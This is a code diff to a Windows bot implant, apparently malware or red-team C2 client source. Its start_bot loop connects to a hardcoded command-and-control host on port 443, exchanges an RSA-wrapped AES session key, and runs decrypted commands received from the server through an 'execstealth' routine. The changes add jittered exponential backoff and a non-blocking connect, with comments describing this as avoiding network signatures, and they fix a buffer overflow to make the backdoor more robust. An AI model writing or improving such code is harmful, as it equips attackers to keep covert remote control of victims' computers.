@@ -60,105 +60,130 @@ void sendToC2(const char* text) {
 }
 
 
-void start_bot(){
+void start_bot() {
     API_TABLE& API = GetAPI();
     WSADATA wsa;
-    
-    // Initialize winsock
-    if(API.WSAStartup(MAKEWORD(2,2), &wsa) != 0){
+
+    //initialize winsock
+    if (API.WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
         exit(1);
     }
-    
-    // Outer loop
+
+    int backoff_ms = 5000;
+    const int max_backoff = 3600000; // 1 hour max limit
+
+    //Outer Loop
     while (1) {
 
-        SOCKET s;
-            
-        // Initialize new socket
-        if ((s = API.socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
-            smart_sleep(5000, 30);
-            continue; // try again
-        }
-            
-        struct sockaddr_in server;
-        server.sin_family = AF_INET;
-        server.sin_addr.s_addr = API.inet_addr(STR("192.168.126.133")); 
-        server.sin_port = API.htons(443);
-
-        int backoff_ms = 5000;           
-        const int max_backoff = 3600000; 
-
-        // Inner Loop 1: Exponential Backoff
-        while(API.connect(s, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
-            smart_sleep(backoff_ms, 20); 
-            backoff_ms *= 2; 
-            if (backoff_ms > max_backoff) {
-                backoff_ms = max_backoff; 
-            }
-        }
-
-        // Set 30-second receive timeout to prevent indefinite blocking
-        DWORD recvTimeout = 30000;
-        API.setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&recvTimeout, sizeof(recvTimeout));
-
-        // RSA + AES
+        // SCOPE DECLARATIONS (Variable Hoisting)
+        SOCKET s = INVALID_SOCKET;
+        struct sockaddr_in server = {0};
+        DWORD socketTimeout = 30000;
         BYTE sessionKey[32] = {0};
-        
-        // Generate AES session key
-        if (!GenerateSessionKey(sessionKey, sizeof(sessionKey))) {
-            API.closesocket(s);
-            continue; // drop connection and try again
-        }
-
         BYTE encryptedKey[256] = {0};
         ULONG encryptedKeySize = sizeof(encryptedKey);
+        char buffer[4096] = {0};
+        DWORD jitter = 0;
+        int select_res = 0;
 
-        // Encrypt AES key with server's RSA public key
+        //Non-Blocking I/O Multiplexing variables
+        u_long iMode = 0;
+        fd_set writefds;
+        fd_set exceptfds;
+        struct timeval timeout;
+
+
+        //NETWORK INITIALIZATION & NON-BLOCKING CONNECT
+
+        s = API.socket(AF_INET, SOCK_STREAM, 0);
+        if (s == INVALID_SOCKET) {
+            goto apply_backoff;
+        }
+
+        //enable Non-Blocking Mode
+        iMode = 1;
+        API.ioctlsocket(s, FIONBIO, &iMode);
+
+        server.sin_family = AF_INET;
+        server.sin_addr.s_addr = API.inet_addr(STR("192.168.126.133"));
+        server.sin_port = API.htons(443);
+
+        //set timeout for receiving data
+        API.setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&socketTimeout, sizeof(socketTimeout));
+
+        API.connect(s, (struct sockaddr*)&server, sizeof(server));
+
+        //File Descriptor sets for select()
+        FD_ZERO(&writefds);
+        FD_ZERO(&exceptfds);
+        FD_SET(s, &writefds);   //socket writable
+        FD_SET(s, &exceptfds);  //connection error
+
+        //custom timeout: 2 seconds
+        //avoids multiple OS SYN retransmissions
+        timeout.tv_sec = 2;
+        timeout.tv_usec = 0;
+
+        select_res = API.select(0, NULL, &writefds, &exceptfds, &timeout);
+
+        if (select_res > 0) {
+            //connection active within 2 seconds
+            if (FD_ISSET(s, &exceptfds)) {
+                //connection failed
+                goto cleanup_and_backoff;
+            }
+            else if (FD_ISSET(s, &writefds)) {
+                //successful connection
+                //reset socket to Blocking Mode
+                iMode = 0;
+                API.ioctlsocket(s, FIONBIO, &iMode);
+            }
+        }
+        else {
+            goto cleanup_and_backoff;
+        }
+
+        //CRYPTOGRAPHIC HANDSHAKE (RSA + AES)
+
+
+        if (!GenerateSessionKey(sessionKey, sizeof(sessionKey))) {
+            goto cleanup_and_backoff;
+        }
+
         if (!EncryptSessionKeyRSA(sessionKey, sizeof(sessionKey), encryptedKey, &encryptedKeySize)) {
-            API.closesocket(s);
-            continue;
+            goto cleanup_and_backoff;
         }
 
-        //send encrypted session key to C2
         if (API.send(s, (const char*)encryptedKey, encryptedKeySize, 0) <= 0) {
-            API.closesocket(s);
-            continue;
+            goto cleanup_and_backoff;
         }
 
-        //update global variable
+        //ESTABLISHED SESSION INITIALIZATION
+
+        //stable connection, backoff=0
+        backoff_ms = 5000;
+
         g_Session.hSocket = s;
         custom_memcpy(g_Session.sessionKey, sessionKey, 32);
         g_Session.active = true;
 
-        // Inner Loop 2: Encrypted Command & Control with Keep-Alive
-        char buffer[4096]; 
+
+        //DATA RECEIVE LOOP (Inner Loop)
+
+
         while (1) {
             memset(buffer, 0, sizeof(buffer));
 
             int bytes_received = API.recv(s, buffer, sizeof(buffer) - 1, 0);
 
             if (bytes_received <= 0) {
-                int error_code = API.WSAGetLastError();
-
-                if (error_code == WSAETIMEDOUT) {
-
-                    DWORD reconnect_delay = 15000 + (API.GetTickCount() % 10000);
-
-                    Sleep(reconnect_delay);
-
-                    continue;
+                //check if connection closed from timeout
+                if (API.WSAGetLastError() == WSAETIMEDOUT) {
+                    continue; //socket still active, retry recv
                 }
-
-                // Small randomized delay on unexpected socket errors
-                DWORD error_delay = 3000 + (API.GetTickCount() % 4000);
-
-                Sleep(error_delay);
-
                 break;
             }
 
-
-            //ensure packet contains at least the 16-byte IV
             if (bytes_received <= 16) continue;
 
             BYTE iv[16];
@@ -170,25 +195,41 @@ void start_bot(){
             BYTE plainText[4096] = {0};
             ULONG plainTextSize = sizeof(plainText);
 
-            // Decrypt payload
             if (AESDecrypt(sessionKey, sizeof(sessionKey), cipherText, cipherTextSize, plainText, &plainTextSize, iv)) {
-                
-                plainText[plainTextSize] = '\0';
-                plainText[strcspn((char*)plainText, "\r\n")] = 0; 
 
-                if(strlen((char*)plainText) == 0 || strcmp((char*)plainText, " ") == 0) continue;
-                    
-                execstealth(s, (char*)plainText);
+                //fix Off-by-One Stack Buffer Overflow
+                if (plainTextSize >= sizeof(plainText)) {
+                    plainTextSize = sizeof(plainText) - 1;
+                }
+
+                plainText[plainTextSize] = '\0';
+                plainText[strcspn((char*)plainText, "\r\n")] = 0;
+
+                if (strlen((char*)plainText) > 0 && strcmp((char*)plainText, " ") != 0) {
+                    execstealth(s, (char*)plainText);
+                }
             }
         }
 
-        // Clean dead socket
-        API.closesocket(s);
-        
-        // Wipe session key from memory before sleeping 
+        //UNIFIED CLEANUP & BACKOFF CONTROL
+
+    cleanup_and_backoff:
+        if (s != INVALID_SOCKET) {
+            API.closesocket(s);
+        }
         SecureZeroMemory(&g_Session, sizeof(SessionContext));
         g_Session.hSocket = INVALID_SOCKET;
         g_Session.active = false;
+
+    apply_backoff:
+        //Jitter (0-2000ms) to avoid Network Signatures και C2 Flooding
+        jitter = API.GetTickCount() % 2000;
+        smart_sleep(backoff_ms + jitter, 20);
+
+        backoff_ms *= 2;
+        if (backoff_ms > max_backoff) {
+            backoff_ms = max_backoff;
+        }
     }
 
     API.WSACleanup();
